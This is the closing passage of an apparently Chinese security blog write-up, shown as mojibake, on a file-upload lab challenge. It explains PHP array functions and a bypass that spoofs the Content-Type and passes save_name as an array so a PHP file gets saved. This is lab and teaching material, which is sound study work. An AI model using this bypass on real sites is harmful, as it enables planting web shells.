<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-prev.html">prev()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-reset.html">reset()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-each.html">each()</a> - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</li>
</ul>
<p>#reset(array)</p>
<p>å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><em>array</em></td>
<td>å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„æ•°ç»„ã€‚</td>
</tr>
</tbody></table>
<p>è¿™å…³æ˜¯ä¿®æ”¹save_nameå°†å…¶æ”¹æˆä¸€ä¸ªæ•°ç»„</p>
<p><img src="/images/16.png"></p>
<p>å› ä¸ºå…ˆéªŒè¯MIMEç±»å‹æ‰€ä»¥éœ€è¦ä¿®æ”¹Conent-Type</p>
<p>ç„¶ååˆ©ç”¨æ•°ç»„æ–¹å¼æ¥ç»•è¿‡åé¢çš„éªŒè¯ã€‚</p>
<p>æ³¨ï¼š</p>
<p>#phpåé¢è¦åŠ / ä¸ç„¶ä¼šç”Ÿæˆfox.php.jpg</p>
<p>#jpgçš„ä½ç½®å¿…é¡»&gt;=2å³â‘£çš„ä½ç½®</p>
<p>#jpgå¯ä»¥æ¢æˆgifæˆ–è€…pngï¼Œä½†å‰é¢ä¸èƒ½åŠ å…¶ä»–çš„ä¸œè¥¿</p>
<p>ç†è§£ä¸äº†ï¼Œå¯ä»¥è‡ªå·±æŠŠæ¯ä¸ªæ­¥éª¤echoå‡ºæ¥è§‚å¯Ÿå˜åŒ–ã€‚ï¼ˆæˆ‘æ˜¯è¿™æ ·åšçš„ï¼Œå¸®åŠ©è‡ªå·±ç†è§£ï¼‰</p>
<p>ä¸è¶³ä¹‹å¤„è¯·è§è°…ï¼ä½œè€…æ˜¯èœé¸Ÿã€‚ã€‚ã€‚</p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/page/5/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/7/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">å†…ç½‘æ¸—é€ç¯‡-NTLM Relayæ”»å‡»</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">å†…ç½‘æ¸—é€ç¯‡-éçº¦æŸ/çº¦æŸå§”æ´¾æ”»å‡»</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">å†…ç½‘æ¸—é€ç¯‡-éš§é“ä»£ç†</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTSååºåˆ—åŒ–æ¼æ´åˆ†æ</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>